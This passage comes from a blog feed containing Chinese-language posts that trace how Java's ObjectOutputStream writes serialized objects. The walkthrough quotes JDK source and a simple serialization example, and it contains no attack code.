src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210716200321909.png" alt="image-20210716200321909"></p><p>思考一个问题，如果我们Person实现了<code>writeObject</code>方法，会怎么样呢？</p><p>如果Person有<code>writeObject</code>方法，那要怎么设计呢？</p><p>先解释第二个问题，来到<code>java.io.ObjectOutputStream#writeSerialData</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes instance data for each serializable class of given object, from</span></span><br><span class="line"><span class="comment"> * superclass to subclass.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;</span><br><span class="line">            PutFieldImpl oldPut = curPut;</span><br><span class="line">            curPut = <span class="keyword">null</span>;</span><br><span class="line">            SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">"custom writeObject data (class \""</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">"\")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                    debugInfoStack.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            curPut = oldPut;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            defaultWriteFields(obj, slotDesc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果该类有<code>writeObject</code>方法，那么就<code>slotDesc.invokeWriteObject(obj, this);</code></p><p>跟进<code>invokeWriteObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Invokes the writeObject method of the represented serializable class.</span></span><br><span class="line"><span class="comment"> * Throws UnsupportedOperationException if this class descriptor is not</span></span><br><span class="line"><span class="comment"> * associated with a class, or if the class is externalizable,</span></span><br><span class="line"><span class="comment"> * non-serializable or does not define writeObject.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invokeWriteObject</span><span class="params">(Object obj, ObjectOutputStream out)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, UnsupportedOperationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    requireInitialized();</span><br><span class="line">    <span class="keyword">if</span> (writeObjectMethod != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObjectMethod.invoke(obj, <span class="keyword">new</span> Object[]&#123; out &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            Throwable th = ex.getTargetException();</span><br><span class="line">            <span class="keyword">if</span> (th <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (IOException) th;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                throwMiscException(th);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="comment">// should not occur, as access checks have been suppressed</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实需要考虑<code>writeObjectMethod</code>这个属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** class-defined writeObject method, or null if none */</span></span><br><span class="line"><span class="keyword">private</span> Method writeObjectMethod;</span><br></pre></td></tr></table></figure><p>这个属性本身类型就是<code>java.lang.reflect.Method</code>，属于反射的作用范围。</p><p>找了一圈发现，在<code>ObjectStreamClass</code>类的构造函数里面就有一句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">writeObjectMethod = getPrivateMethod(cl, <span class="string">"writeObject"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectOutputStream<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">Void</span>.<span class="title">TYPE</span>)</span>;</span><br><span class="line">readObjectMethod = getPrivateMethod(cl, <span class="string">"readObject"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectInputStream<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">Void</span>.<span class="title">TYPE</span>)</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以在这里，已经判断了这个类是否存在<code>writeObject</code>方法，同时也寻找了<code>readObject</code>方法。</p><p>如果<code>writeObejct</code>存在的话就封装为<code>Method</code>，赋值给<code>writeObjectMethod</code>属性。</p><p>细心的你应该也能发现，这里对<code>writeObject</code>做了限制：</p><ul><li>参数必须为ObjectOutputStream类型</li><li>返回值必须为void</li><li>必须为 private</li><li>非static</li></ul><p>到这里我们解答了第二个问题，并且知道，如果你要实现writeObject必须要形式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span></span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那现在就写一个：</p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210716202716995.png" alt="image-20210716202716995" style="zoom:50%;"><p>我们在<code>writeObject</code>方法内部只是调用defaultWriteObject()方法写入对象字段数据。</p><p>再看一遍：</p><p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210716203132016.png" alt="image-20210716203132016"></p><p>可以发现在最后面多了一块：</p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210717101423353.png" alt="image-20210717101423353" style="zoom:50%;"><p>并且在前面多了一块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br></pre></td></tr></table></figure><p>表明当前对象的类是有<code>writeObject</code>方法的</p><p>由于<code>annotateClass()</code>方法默认为空，所以<code>objectAnnotations</code>后一般会设置<code>TC_ENDBLOCKDATA</code>标识；</p><p>如果我们自己的<code>writeObject</code>不仅仅是<code>defaultWriteObject</code>：</p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210717101958948.png" alt="image-20210717101958948" style="zoom:50%;"><p>对比看区别：</p><p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210717101937318.png" alt="image-20210717101937318"></p><p>在classdata部分又多出来了一些内容，也就是写入了自定义数据，</p><p><code>blockdata</code>表示下面的就是一个数据块，因为我们往里存放的是一个整数<code>666</code>，所以长度为int类型的长度4，contents内容就是16进制的666。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnpanda.net/talksafe/892.html" target="_blank" rel="noopener">panda</a></p><p><a href="https://xz.aliyun.com/t/8686" target="_blank" rel="noopener">xz.aliyun.com</a></p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">Object Serialization Stream Protocol</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;协议原文&lt;a href=&quot;https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Object Serialization Stream Protocol&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://fynch3r.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化流程梳理</title>
    <link href="https://fynch3r.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>https://fynch3r.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-15T11:37:36.000Z</published>
    <updated>2021-12-05T10:03:34.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>梳理Java序列化流程。</p><p>参考<a href="https://www.cnpanda.net/" target="_blank" rel="noopener">panda</a>师傅。</p><a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>Java序列化就是将对象写入到I/O流之中，通常输出格式为<code>.ser</code>文件。</p><p>简单说首先创建一个<code>ObjectOutputStream</code>输出流对象，然后调用<code>ObjectOutputStream</code>对象的<code>writeObject</code>方法，按照规范格式输出可序列化对象。</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><p>接下来一步一步走，消化一遍<a href="https://www.cnpanda.net/sec/893.html" target="_blank" rel="noopener">panda</a>师傅的文章。</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String string;</span><br><span class="line">        <span class="keyword">transient</span> String name = <span class="string">"hello"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.string = s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            Demo demo = <span class="keyword">new</span> Demo(<span class="string">"panda"</span>);</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"panda.out"</span>));</span><br><span class="line">            outputStream.writeObject(<span class="keyword">new</span> Demo(<span class="string">"panda"</span>));</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"panda.out"</span>));</span><br><span class="line">outputStream.writeObject(<span class="keyword">new</span> Demo(<span class="string">"panda"</span>));</span><br></pre></td></tr></table></figure><p>首先来到<code>public ObjectOutputStream(OutputStream out)</code>构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 创建写入指定输出流的ObjectOutputStream。</span></span><br><span class="line"><span class="comment">* 此构造函数将序列化流头写入底层流；</span></span><br><span class="line"><span class="comment">* 调用者可能希望立即刷新流，以确保接收ObjectInputStreams的构造函数在读取头时不会阻塞。</span></span><br><span class="line"><span class="comment">* 如果安装了安全管理器，则当重写ObjectOutputStream.putFields或ObjectOutputStream.writeUnshared方法的子类的构造函数直接或间接调用时，此构造函数将检查“enableSublassimplementation”SerializablePermission。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> BlockDataOutputStream(out);</span><br><span class="line">    handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>, (<span class="keyword">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> ReplaceTable(<span class="number">10</span>, (<span class="keyword">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="keyword">false</span>;</span><br><span class="line">    writeStreamHeader();</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> DebugTraceInfoStack();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一头雾水，接下来一步一步梳理：</p><p><code>verifySubclass()</code>方法:</p><blockquote><p>验证本类（或其子类）实例可以在不违反安全约束的情况下被构造出来。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">verifySubclass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; cl = getClass();</span><br><span class="line">    <span class="comment">//如果构造的不是ObjectOutputStream的子类则直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (cl == ObjectOutputStream<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">        <span class="title">return</span></span>;</span><br><span class="line">    <span class="comment">//否则获取安全管理器检查是否有继承ObjectOutputStream的权限</span></span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//移除Caches中已经失去引用的Class对象</span></span><br><span class="line">    processQueue(Caches.subclassAuditsQueue, Caches.subclassAudits);</span><br><span class="line">    <span class="comment">//将ObjectOutputStream的子类存入Caches</span></span><br><span class="line">    WeakClassKey key = <span class="keyword">new</span> WeakClassKey(cl, Caches.subclassAuditsQueue);</span><br><span class="line"> </span><br><span class="line">    Boolean result = Caches.subclassAudits.get(key);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="keyword">null</span>) &#123;</span><br><span class="line">        result = Boolean.valueOf(auditSubclass(cl));</span><br><span class="line">        Caches.subclassAudits.putIfAbsent(key, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.booleanValue())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//如果没有权限则抛出SecurityException异常</span></span><br><span class="line">    sm.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来可以看到对<code>bout,handles,subs,enableOverride</code>一些成员变量进行了复制，跳到他们的声明处看一看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** filter stream for handling block data conversion */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> BlockDataOutputStream bout;</span><br><span class="line"><span class="comment">/** obj -&gt; wire handle map */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> HandleTable handles;</span><br><span class="line"><span class="comment">/** obj -&gt; replacement obj map */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReplaceTable subs;</span><br><span class="line"><span class="comment">/** stream protocol version */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> protocol = PROTOCOL_VERSION_2;</span><br><span class="line"><span class="comment">/** recursion depth */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> depth;</span><br><span class="line"><span class="comment">/** buffer for writing primitive field values */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] primVals;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** if true, invoke writeObjectOverride() instead of writeObject() */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> enableOverride;</span><br><span class="line"><span class="comment">/** if true, invoke replaceObject() */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> enableReplace;</span><br></pre></td></tr></table></figure><p>重点挑这几个说：</p><ul><li>bout：用来处理数据块转换的数据流，理解为一个容器</li><li>handles ：对象-&gt;handle引用</li><li>subs:  对象-&gt;替换对象</li><li>enableOverride：布尔值 用来决定在序列化Java对象时选用<code>writeObjectOverride</code>方法还是<code>writeObject</code>方法 通常为false</li></ul><p>关于 handles 的作用，举个例子，<strong>我们知道 Java 序列化除了保存字段信息外，还保存有类信息</strong>，当同一个对象序列化两次时第二次只用保存第一次的编号，这样可以大大减少序列化文件的大小。</p><p>你肯定对第一个bout的理解有些别扭。</p><p>开启支线任务，什么是<strong>BlockDataOutputStream</strong>？</p><h3 id="BlockDataOutputStream"><a href="#BlockDataOutputStream" class="headerlink" title="BlockDataOutputStream"></a>BlockDataOutputStream</h3><p><code>BlockDataOutputStream</code>是<code>ObjectOutputStream</code>的一个重要内部类，<strong>这个类负责将缓冲区中的数据写入到字节流</strong>。</p><p>该类部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * Buffered output stream with two modes: in default mode, outputs data in</span><br><span class="line">     * same format as DataOutputStream; in &quot;block data&quot; mode, outputs data</span><br><span class="line">     * bracketed by block data markers (see object serialization specification</span><br><span class="line">     * for details).</span><br><span class="line">     *&#x2F;</span><br><span class="line">private static class BlockDataOutputStream extends OutputStream implements DataOutput</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;** maximum data block length *&#x2F;</span><br><span class="line">    private static final int MAX_BLOCK_SIZE &#x3D; 1024;</span><br><span class="line">    &#x2F;** maximum data block header length *&#x2F;</span><br><span class="line">    private static final int MAX_HEADER_SIZE &#x3D; 5;</span><br><span class="line">    &#x2F;** (tunable) length of char buffer (for writing strings) *&#x2F;</span><br><span class="line">    private static final int CHAR_BUF_SIZE &#x3D; 256;</span><br><span class="line"></span><br><span class="line">    &#x2F;** buffer for writing general&#x2F;block data *&#x2F;</span><br><span class="line">    private final byte[] buf &#x3D; new byte[MAX_BLOCK_SIZE];</span><br><span class="line">    &#x2F;** buffer for writing block data headers *&#x2F;</span><br><span class="line">    private final byte[] hbuf &#x3D; new byte[MAX_HEADER_SIZE];</span><br><span class="line">    &#x2F;** char buffer for fast string writes *&#x2F;</span><br><span class="line">    private final char[] cbuf &#x3D; new char[CHAR_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    &#x2F;** block data mode *&#x2F;</span><br><span class="line">    private boolean blkmode &#x3D; false;</span><br><span class="line">    &#x2F;** current offset into buf *&#x2F;</span><br><span class="line">    private int pos &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;** underlying output stream *&#x2F;</span><br><span class="line">    private final OutputStream out;</span><br><span class="line">    &#x2F;** loopback stream (for data writes that span data blocks) *&#x2F;</span><br><span class="line">    private final DataOutputStream dout;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Creates new BlockDataOutputStream on top of given underlying stream.</span><br><span class="line">     * Block data mode is turned off by default.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    BlockDataOutputStream(OutputStream out) &#123;</span><br><span class="line">        this.out &#x3D; out;</span><br><span class="line">        dout &#x3D; new DataOutputStream(this);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是：</p><blockquote><p>缓冲输出流有两种模式：</p><p>在默认模式下，以与DataOutputStream相同的格式输出数据；</p><p>在 “块数据 “模式下，输出数据 在 “块数据 “模式下，输出由块数据标记括起来的数据 – 详见对象序列化规范。</p><p>可以理解成<code>BlockDataOutputStream</code>类是封装后的<code>DataOutputStream</code>类，并且提供了一些缓冲区及成员属性。</p></blockquote><p>在给这些成员变量赋值结束之后，接下来进入<code>writeStreamHeader</code>方法。</p><img src="../images/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210715201920550.png" alt="image-20210715201920550" style="zoom:50%;"><p>熟悉的<code>aced0005</code>出现了，可以理解为<code>bout</code>就是我们的句柄，负责缓存我们的序列化数据。</p><p>接下来是<code>bout.setBlockDataMode(true);</code> 将<code>bout</code>设置为<strong>块模式</strong></p><h2 id="核心：writeObject"><a href="#核心：writeObject" class="headerlink" title="核心：writeObject"></a>核心：writeObject</h2><p>构造函数执行结束之后，就要来到第二句话:<code>outputStream.writeObject(new Demo(&quot;panda&quot;));</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">       writeObjectOverride(obj);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       writeObject0(obj, <span class="keyword">false</span>);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">       <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">           writeFatalException(ex);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">throw</span> ex;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说；writeObject 将所有序列委托给了 writeObject0 完成，如果序列化出现异常调用 writeFatalException 方法。</p><p>首先是<code>if(enableOverride)</code> ，这里面的<code>enableOverride</code>其实一般都是false(上一步的构造函数)，那么就直接进入到<code>writeObject0</code>方法：</p><h3 id="核中核-：writeObject0"><a href="#核中核-：writeObject0" class="headerlink" title="核中核 